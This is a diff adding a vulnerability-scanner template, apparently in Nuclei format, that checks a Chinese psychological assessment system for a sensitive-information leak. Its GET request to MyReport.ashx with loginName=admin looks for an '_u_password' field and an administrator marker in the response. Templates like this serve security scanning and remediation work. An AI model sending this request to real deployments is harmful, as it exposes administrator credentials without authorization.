@@ -1,0 +1,27 @@
+id: poc-yaml-jsxz-ceping-myreport-ashx-info-disclosure
+
+info:
+  name: 京师心智心理健康测评系统 MyReport.ashx 敏感信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"_u_password\""
+          - "管理员"
+      - type: word
+        part: body
+        words:
+          - "<html>"
+        negative: true
